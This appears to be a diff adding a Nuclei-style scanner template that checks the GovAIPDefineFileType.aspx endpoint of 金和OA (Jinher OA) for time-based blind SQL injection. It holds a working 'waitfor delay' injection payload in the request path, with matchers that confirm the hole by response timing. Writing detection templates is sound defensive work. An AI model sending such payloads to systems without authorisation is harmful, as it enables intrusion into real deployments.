@@ -1,0 +1,33 @@
+id: jinher-jhsoft-govaipdefinefiletype-aspx-sqli
+info:
+  name: 金和OA GovAIPDefineFileType.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the GovAIPDefineFileType.aspx endpoint of 金和OA.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.govsetaip/GovAIPDefineFileType.aspx/?intId=1'waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "选择类型"
+          - "稿纸类型定义"
+          - "JHSoft"
+        condition: and
+        part: body
+      - type: dsl
+        dsl:
+          - duration >= t1
+          - duration <= t2
